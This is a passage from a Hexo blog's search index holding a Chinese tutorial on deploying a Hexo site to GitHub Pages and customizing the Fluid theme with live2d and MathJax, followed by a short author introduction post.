title="image-20230808162106017"><p>首次使用主题的「关于页」需要手动创建：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> about<br></code></pre></td></tr></table></figure><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162133409.png" class="" title="image-20230808162133409"><p>创建成功后，编辑博客目录下 /source/about/index.md，添加 layout 属性。</p><p>修改后的文件示例如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-attr">title:</span> <span class="hljs-string">about</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-09 19:20:33</span><br><span class="hljs-attr">layout:</span> <span class="hljs-string">about</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/image-20230808162259101.png" class="" title="image-20230808162259101"><h3 id="博客部署到Github"><a href="#博客部署到Github" class="headerlink" title="博客部署到Github"></a>博客部署到Github</h3><p>安装hexo-deployer-git</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>修改根目录下的<code> _config.yml</code>，配置 GitHub 相关信息</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">  type:</span> git<br><span class="hljs-symbol">  repo:</span> https:<span class="hljs-comment">//token@github.com/remixxyh/remixxyh.github.io.git #免密push</span><br><span class="hljs-symbol">  branch:</span> main<br><span class="hljs-symbol">  token:</span> 你的token<br></code></pre></td></tr></table></figure><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2024-04-23_10-41-16.png" class=""><p>执行命令完成部署，可能出现一些git的报错，自寻搜索即可解决</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo g -d<br></code></pre></td></tr></table></figure><h3 id="图片插件"><a href="#图片插件" class="headerlink" title="图片插件"></a><strong>图片插件</strong></h3><p>插件<code>hexo-renderer-marked</code>解决了这个问题。可以只用<code>npm install hexo-renderer-marked</code>命令直接安装，之后在根目录下的<code>config.yml</code>中更改配置如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">post_asset_folder</span>: <span class="hljs-literal">true</span><br><span class="hljs-attr">marked</span>:<br>  <span class="hljs-attr">prependRoot</span>: <span class="hljs-literal">true</span><br>  <span class="hljs-attr">postAsset</span>: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>之后就可以在使用<code>![](image.jpg)</code>的方式愉快的插入图片了</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-41-43.png" class=""><h3 id="个性化fluid"><a href="#个性化fluid" class="headerlink" title="个性化fluid"></a>个性化fluid</h3><h4 id="个性化页面"><a href="#个性化页面" class="headerlink" title="个性化页面"></a>个性化页面</h4><p>修改<code>themes/fluid</code>下的<code>_config.yml</code>，这是主题相关的配置文件</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-44-04.png" class=""><h5 id="修改浏览器标签"><a href="#修改浏览器标签" class="headerlink" title="修改浏览器标签"></a>修改浏览器标签</h5><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-59-38.png" class=""><h5 id="修改导航栏title"><a href="#修改导航栏title" class="headerlink" title="修改导航栏title"></a>修改导航栏title</h5><p>搜索：<code>navbar</code></p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-01-09.png" class=""><h5 id="修改欢迎字样"><a href="#修改欢迎字样" class="headerlink" title="修改欢迎字样"></a>修改欢迎字样</h5><p>搜索：<code>slogan</code></p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-03-16.png" class=""><h5 id="修改关于页面"><a href="#修改关于页面" class="headerlink" title="修改关于页面"></a>修改关于页面</h5><p>在配置文件里搜索：<code>about</code>，即可修改关于页面；图片资源在<code>hexo-blog\themes\fluid\source\img</code>文件夹里添加修改</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-50-47.png" class=""><p>效果：</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_22-52-35.png" class=""><h4 id="添加live2d桌宠"><a href="#添加live2d桌宠" class="headerlink" title="添加live2d桌宠"></a>添加live2d桌宠</h4><h5 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h5><p>首先我们需要安装一个插件，用于在<code>hexo</code>里使用<code>live2d</code></p><p><code>npm install --save hexo-helper-live2d</code></p><h5 id="下载安装live2d模型"><a href="#下载安装live2d模型" class="headerlink" title="下载安装live2d模型"></a>下载安装live2d模型</h5><p>通过<code>npm install npm install --save live2d-widget-model-xxx</code>来安装你喜欢的模型</p><p>比方说我喜欢的是小猫猫，那就使用<code>npm install npm install --save live2d-widget-model-tororo</code>进行安装</p><p><a href="https://blog.51cto.com/u_16162646/6494412">模型预览</a></p><p><a href="https://github.com/xiazeyu/live2d-widget-models">模型Github地址</a></p><p>安装后我们在根目录下的<code>node_modules</code>目录下面找到<code>live2d-widget-model-tororo</code>这个文件夹，把这个文件夹复制下来，找到我们的<code>hexo</code>博客的根目录（也可以在根目录新建一个文件夹专门存放模型），把刚刚我们复制的文件粘贴过来</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-18-54.png" class=""><h5 id="添加配置文件"><a href="#添加配置文件" class="headerlink" title="添加配置文件"></a>添加配置文件</h5><p>在根目录下的<code>_config.yml</code>配置，这样以后换了主题就不用重新配置了，<strong>注意在<code>model</code>那里填写自己的模型文件名称</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">live2d:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 是否启动</span><br>  <span class="hljs-attr">scriptFrom:</span> <span class="hljs-string">local</span> <span class="hljs-comment"># 默认</span><br>  <span class="hljs-attr">pluginRootPath:</span> <span class="hljs-string">live2dw/</span>  <span class="hljs-comment"># 插件在站点上的根目录(相对路径)</span><br>  <span class="hljs-attr">pluginJsPath:</span> <span class="hljs-string">lib/</span>  <span class="hljs-comment"># 脚本文件相对与插件根目录路径</span><br>  <span class="hljs-attr">pluginModelPath:</span> <span class="hljs-string">assets/</span>  <span class="hljs-comment"># 模型文件相对与插件根目录路径</span><br>  <span class="hljs-attr">tagMode:</span> <span class="hljs-literal">false</span>  <span class="hljs-comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span><br>  <span class="hljs-attr">debug:</span> <span class="hljs-literal">false</span>  <span class="hljs-comment"># 调试, 是否在控制台输出日志</span><br>  <span class="hljs-attr">model:</span><br>    <span class="hljs-attr">use:</span> <span class="hljs-string">live2d-widget-model-tororo</span> <span class="hljs-comment">## 模型文件</span><br>  <span class="hljs-attr">display:</span><br>    <span class="hljs-attr">position:</span> <span class="hljs-string">right</span> <span class="hljs-comment"># 定位方向 left right top bottom</span><br>    <span class="hljs-attr">width:</span> <span class="hljs-number">150</span>  <span class="hljs-comment"># 小人宽度</span><br>    <span class="hljs-attr">height:</span> <span class="hljs-number">300</span> <span class="hljs-comment">#  小人高度</span><br>    <span class="hljs-attr">hOffset:</span> <span class="hljs-number">-15</span>  <span class="hljs-comment"># 向 偏移</span><br>    <span class="hljs-attr">vOffset:</span> <span class="hljs-number">-15</span>  <span class="hljs-comment"># 像 偏移</span><br>  <span class="hljs-attr">mobile:</span><br>    <span class="hljs-attr">show:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 手机端是否显示</span><br>  <span class="hljs-attr">react:</span><br>    <span class="hljs-attr">opacity:</span> <span class="hljs-number">0.7</span>  <span class="hljs-comment"># 模型透明度</span><br></code></pre></td></tr></table></figure><p>添加到文件末尾即可：</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-10-54.png" class=""><p>然后你就成功拥有一只小猫啦！</p><img src="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/Snipaste_2023-09-01_23-19-57.png" class=""><h3 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h3><h4 id="步骤1-卸载hexo-math"><a href="#步骤1-卸载hexo-math" class="headerlink" title="步骤1:卸载hexo-math"></a>步骤1:卸载hexo-math</h4><p>  在你的Hexo框架的blog根目录下打开终端，输入以下指令:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">npm uninstall hexo-<span class="hljs-built_in">math</span> <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><h4 id="步骤2-安装hexo-filter-mathjax"><a href="#步骤2-安装hexo-filter-mathjax" class="headerlink" title="步骤2:安装hexo-filter-mathjax"></a>步骤2:安装hexo-filter-mathjax</h4><p>  同样在你的blog根目录下，安装插件:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">npm install hexo-<span class="hljs-attribute">filter</span>-mathjax  <span class="hljs-attr">--save</span><br></code></pre></td></tr></table></figure><h4 id="步骤3-在全局配置中配置公式渲染"><a href="#步骤3-在全局配置中配置公式渲染" class="headerlink" title="步骤3:在全局配置中配置公式渲染"></a>步骤3:在全局配置中配置公式渲染</h4><p>   在你的Hexo框架的blog根目录下打开<code>_config.yml</code>文件，在文件中加入如下内容:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">mathjax:</span><br>  <span class="hljs-attr">tags:</span> <span class="hljs-string">none</span> <span class="hljs-comment"># or 'ams' or 'all'</span><br>  <span class="hljs-attr">single_dollars:</span> <span class="hljs-literal">true</span> <span class="hljs-comment"># enable single dollar signs as in-line math delimiters</span><br>  <span class="hljs-attr">cjk_width:</span> <span class="hljs-number">0.9</span> <span class="hljs-comment"># relative CJK char width</span><br>  <span class="hljs-attr">normal_width:</span> <span class="hljs-number">0.6</span> <span class="hljs-comment"># relative normal (monospace) width</span><br>  <span class="hljs-attr">append_css:</span> <span class="hljs-literal">true</span> <span class="hljs-comment"># add CSS to pages rendered by MathJax</span><br>  <span class="hljs-attr">every_page:</span> <span class="hljs-literal">false</span> <span class="hljs-comment"># if true, every page will be rendered by MathJax regardless the `mathjax` setting in Front-matter</span><br></code></pre></td></tr></table></figure><p>各个参数的用处可以看代码注释。没有特别需求基本不需要更改。</p><h4 id="步骤4-需要公式的博客文章启用公式渲染器"><a href="#步骤4-需要公式的博客文章启用公式渲染器" class="headerlink" title="步骤4:需要公式的博客文章启用公式渲染器"></a>步骤4:需要公式的博客文章启用公式渲染器</h4><p>在你写的，需要使用公式的markdown文档的front-matter中添加一个参数：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">mathjax:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>以本博客的front-matter为例:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">在Github上搭建自己的个人博客</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2022-12-09 10:01:49</span><br><span class="hljs-attr">categories:</span> <span class="hljs-string">杂项</span><br><span class="hljs-attr">tags:</span> [<span class="hljs-string">Github博客搭建</span>]<br><span class="hljs-attr">mathjax:</span> <span class="hljs-literal">true</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>如果你认为给单独一篇文章加参数太麻烦，你也可以在<code>_config.yml</code>文件中刚刚添加的<code>mathjax</code>设定下，把<code>every_page</code>的参数改为<code>ture</code>。</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Github博客搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客简介</title>
    <link href="/2022/12/08/%E5%8D%9A%E5%AE%A2%E7%AE%80%E4%BB%8B/"/>
    <url>/2022/12/08/%E5%8D%9A%E5%AE%A2%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="欢迎来到3xsh0re的博客"><a href="#欢迎来到3xsh0re的博客" class="headerlink" title="欢迎来到3xsh0re的博客"></a>欢迎来到3xsh0re的博客</h2><span id="more"></span><p>USTB大三在读，信息安全专业</p><p>浅浅记录，什么都更，maybe就是个日记本哈哈😋</p><img src="/2022/12/08/%E5%8D%9A%E5%AE%A2%E7%AE%80%E4%BB%8B/Pikachu.png" class="">]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>简介</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
